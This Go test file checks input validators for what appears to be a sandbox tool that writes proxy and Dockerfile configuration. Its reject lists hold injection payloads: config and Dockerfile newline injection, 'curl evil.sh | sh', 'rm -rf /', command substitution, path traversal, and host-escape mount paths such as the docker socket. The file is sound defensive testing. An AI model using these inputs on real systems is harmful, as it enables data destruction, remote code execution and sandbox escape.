package security

import "testing"

func TestValidateDomainAccepts(t *testing.T) {
	valid := []string{
		"api.anthropic.com",
		"github.com",
		"*.githubusercontent.com",
		"registry.npmjs.org",
		"a.b.c.d.example.com",
		"xn--80ak6aa92e.com",
		"localhost",
	}
	for _, d := range valid {
		if err := ValidateDomain(d); err != nil {
			t.Errorf("ValidateDomain(%q) = %v, want nil", d, err)
		}
	}
}

func TestValidateDomainRejectsInjection(t *testing.T) {
	// Each of these would otherwise be written verbatim into squid.conf.
	// A newline ends the acl line and lets the rest become its own directive.
	invalid := []string{
		"",
		"   ",
		"evil.com\nhttp_access allow all",
		"evil.com\rhttp_access allow all",
		"evil.com http_access allow all",
		"evil.com\x00",
		"-leading-dash.com",
		"trailing-dash-.com",
		".leading.dot.com",
		"has space.com",
		"under_score.com",
		"*.*.com",
		"*",
		"evil.com;rm -rf /",
		"evil.com\thttp_access allow all",
	}
	for _, d := range invalid {
		if err := ValidateDomain(d); err == nil {
			t.Errorf("ValidateDomain(%q) = nil, want error", d)
		}
	}
}

func TestValidateDomainLengthLimits(t *testing.T) {
	long := ""
	for len(long) < 260 {
		long += "a"
	}
	if err := ValidateDomain(long); err == nil {
		t.Error("expected error for over-long domain")
	}

	label := ""
	for len(label) < 64 {
		label += "b"
	}
	if err := ValidateDomain(label + ".com"); err == nil {
		t.Error("expected error for over-long label")
	}
}

func TestValidateProfileNameRejectsTraversal(t *testing.T) {
	// A profile name becomes a filename under ~/.config/rig/profiles, so a
	// traversing name would let an imported profile write anywhere.
	invalid := []string{
		"",
		"../escape",
		"../../etc/cron.d/evil",
		"/absolute",
		"has space",
		"has/slash",
		"has:colon",
		".hidden",
		"-leading-dash",
		"name\nnewline",
		"name\x00null",
	}
	for _, n := range invalid {
		if err := ValidateProfileName(n); err == nil {
			t.Errorf("ValidateProfileName(%q) = nil, want error", n)
		}
	}

	for _, n := range []string{"my-sandbox", "claude_dev", "a", "A1", "test-123"} {
		if err := ValidateProfileName(n); err != nil {
			t.Errorf("ValidateProfileName(%q) = %v, want nil", n, err)
		}
	}
}

func TestValidateMountSourceRejectsHostEscape(t *testing.T) {
	// Each of these would hand the sandbox control of the host.
	forbidden := []string{
		"/var/run/docker.sock",
		"/run/docker.sock",
		"/var/run/docker.sock/",
		"/var/lib/docker",
		"/var/lib/docker/volumes",
		"/proc",
		"/proc/sys",
		"/sys/fs/cgroup",
		"/dev",
		"/dev/mem",
		"/etc",
		"/etc/shadow",
		"/boot",
		"/",
		// Traversal that resolves back onto a forbidden path.
		"/var/lib/../run/docker.sock",
		"/etc/../var/run/docker.sock",
		"/home/user/../../proc/self/mem",
		"relative/path",
		"",
	}
	for _, p := range forbidden {
		if err := ValidateMountSource(p); err == nil {
			t.Errorf("ValidateMountSource(%q) = nil, want error", p)
		}
	}

	for _, p := range []string{"/home/user/code", "/srv/data", "/mnt/shared"} {
		if err := ValidateMountSource(p); err != nil {
			t.Errorf("ValidateMountSource(%q) = %v, want nil", p, err)
		}
	}
}

func TestValidateMountTarget(t *testing.T) {
	for _, p := range []string{"", "relative", "/", "/a:b", "/a\x00b"} {
		if err := ValidateMountTarget(p); err == nil {
			t.Errorf("ValidateMountTarget(%q) = nil, want error", p)
		}
	}
	for _, p := range []string{"/home/sandbox/workspace", "/data"} {
		if err := ValidateMountTarget(p); err != nil {
			t.Errorf("ValidateMountTarget(%q) = %v, want nil", p, err)
		}
	}
}

func TestValidatePackageNameRejectsDockerfileInjection(t *testing.T) {
	// Tool names are interpolated into a RUN line inside a backslash
	// continuation, so a newline could append its own instruction.
	invalid := []string{
		"",
		"ripgrep\nRUN curl evil.sh | sh",
		"ripgrep \\",
		"rip grep",
		"UPPERCASE",
		"pkg;rm -rf /",
		"pkg$(id)",
		"pkg`id`",
		"-leading",
	}
	for _, p := range invalid {
		if err := ValidatePackageName(p); err == nil {
			t.Errorf("ValidatePackageName(%q) = nil, want error", p)
		}
	}
	for _, p := range []string{"ripgrep", "python3-pip", "build-essential", "fd-find", "g++", "lib32z1"} {
		if err := ValidatePackageName(p); err != nil {
			t.Errorf("ValidatePackageName(%q) = %v, want nil", p, err)
		}
	}
}

func TestValidateSize(t *testing.T) {
	for _, s := range []string{"", "10g", "512m", "1t", "2.5g", "100"} {
		if err := ValidateSize(s); err != nil {
			t.Errorf("ValidateSize(%q) = %v, want nil", s, err)
		}
	}
	for _, s := range []string{"10gb", "big", "-5g", "10g; rm -rf /", "10 g"} {
		if err := ValidateSize(s); err == nil {
			t.Errorf("ValidateSize(%q) = nil, want error", s)
		}
	}
}
